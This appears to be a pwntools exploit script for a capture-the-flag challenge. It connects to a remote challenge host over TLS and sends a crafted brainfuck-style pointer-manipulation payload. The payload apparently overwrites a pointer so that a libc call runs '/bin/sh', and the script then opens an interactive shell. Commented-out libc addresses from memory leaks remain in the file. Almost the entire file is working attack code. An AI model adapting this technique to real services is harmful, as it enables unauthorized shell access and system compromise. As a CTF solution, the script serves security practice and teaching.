from pwn import *


context.log_level = 'info'
context.arch = 'amd64'
context.os = 'linux'

gdb_script = f"""
xuntil run
break main
 """
# p = gdb.debug("./app", gdbscript=gdb_script)
e = ELF("app")
# p = process("./app")
p = remote("inst-54fv04v0q1.tls.vuln.si", 443, ssl=True)


# payload = b"<"*8*11 + b'+'*0x70 + b'>' + b'+'*34 + b'>'+b'-'*3
# payload = b"<"*8*11 + b'+'*0x70 + b'>' + b'+'*34 + b'>'+b'-'*3
payload = b"<"*8*11 + b"-"*144 + b">" + 12*b'+' + b'>' + 3*b'-'
print(str(payload))
print(len(payload))
p.sendline(payload)
p.sendline(b"/bin/sh\x00")
# p.sendline(b"")
p.recvuntil("Running\n")

# data = hex(u64(p.recv(8)))
# print(data)

#print 0x7f67a5bbfbd0
#puts 0x7f67a5bed960

p.interactive()

# 0x7fc66be48bd0
# 0x7fc66be76960
